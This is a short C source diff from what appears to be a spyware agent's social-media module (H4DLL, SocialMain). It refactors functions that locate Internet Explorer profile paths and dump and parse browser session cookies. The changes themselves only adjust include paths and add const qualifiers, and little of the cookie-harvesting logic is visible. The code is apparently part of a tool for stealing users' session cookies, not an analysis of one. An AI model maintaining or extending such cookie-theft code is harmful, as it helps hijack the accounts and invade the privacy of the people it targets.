@@ -1,8 +1,8 @@
 #include <windows.h>
 #define _CRT_SECURE_NO_WARNINGS 1
 #include <stdio.h>
-#include "../common.h"
-#include "../bss.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
 #include "CookieHandler.h"
 #include "SocialMain.h"
 
@@ -66,7 +66,7 @@ void ParseIECookieFile(WCHAR *file)
 	SAFE_FREE(session_memory);
 }
 
-WCHAR *GetIEProfilePath(WCHAR *cookie_path)
+WCHAR *GetIEProfilePath(const WCHAR *cookie_path)
 {
 	static WCHAR FullPath[MAX_PATH];
 	WCHAR appPath[MAX_PATH];
@@ -78,7 +78,7 @@ WCHAR *GetIEProfilePath(WCHAR *cookie_path)
 }
 
 // Divide e parsa i singoli cookie all'interno di uno stringone
-void ParseSessionCookies(char *cookie_string, char *domain)
+void ParseSessionCookies(char *cookie_string, const char *domain)
 {
 	char *ptr1, *ptr2, *ptr3;
 	
@@ -107,7 +107,7 @@ void ParseSessionCookies(char *cookie_string, char *domain)
 	} while(ptr1);
 }
 
-int DumpIECookies(WCHAR *cookie_path)
+int DumpIECookies(const WCHAR *cookie_path)
 {
 	WCHAR *ie_dir;
 	WIN32_FIND_DATAW find_data;
